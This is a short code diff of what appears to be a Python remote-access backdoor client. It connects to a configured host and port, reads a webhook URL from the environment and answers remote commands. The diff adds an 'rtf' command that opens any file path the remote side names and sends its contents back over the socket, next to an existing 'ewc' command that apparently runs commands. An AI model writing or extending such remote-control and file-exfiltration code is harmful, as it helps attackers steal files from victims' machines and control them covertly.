@@ -18,7 +18,7 @@ startup = False
 ip = "127.0.0.1"
 port = 8080
 
-WEBHOOK_URL = os.getenv(WEBHOOK_URL)
+WEBHOOK_URL = os.getenv("D_WEBHOOK_URL")
 PING = True
 
 # END OF CONFIG
@@ -131,6 +131,20 @@ while True:
             end = str(['ewc', result])
             end = end.encode()
 
+            s.send(end)
+            
+        if incoming_message[0] == "rtf":
+            end = str(['rtf', "Unknown error occured."])
+            
+            if os.path.isfile(incoming_message[1]):
+                with open(incoming_message[1], 'r') as f:
+                    content = f.readlines()
+                f.close()
+                end = str(['rtf', content])
+            else:
+                end = str(['rtf', "Invalid path provided."])
+                
+            end = end.encode()
             s.send(end)
             
     except:
